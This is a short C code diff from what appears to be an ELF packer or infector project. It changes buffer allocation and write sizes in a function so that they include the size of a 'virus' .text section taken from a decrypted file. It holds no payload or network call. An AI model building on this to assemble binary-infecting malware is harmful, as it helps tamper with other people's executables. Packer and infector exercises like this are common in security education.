@@ -115,7 +115,7 @@ void	woody_start(void *ptr, unsigned int size, int fd)
 	void		*inf_addr = open_decrypt(&buf, &fd_infect);
 	Elf64_Shdr *virus_text = elf_find_section(inf_addr, ".text");
 	fprintf (stderr, "NO Errors occurs\n");
-	char *woody = (char *)malloc(sizeof(char) * (/*virus_text->sh_size + 1 + */size));	
+	char *woody = (char *)malloc(sizeof(char) * (virus_text->sh_size + 1 + size));	
 	
 	if (woody == NULL)
 	{
@@ -174,6 +174,6 @@ void	woody_start(void *ptr, unsigned int size, int fd)
 	// header->e_shoff -= virus_text->sh_size;
 	// change_offset(ptr, virus_text->sh_size, 1);
 	
-	open_woody((void *)woody, size/* + virus_text->sh_size + 1*/, fd, fd_infect);
+	open_woody((void *)woody, size + virus_text->sh_size + 1, fd, fd_infect);
 	free(woody);
 }
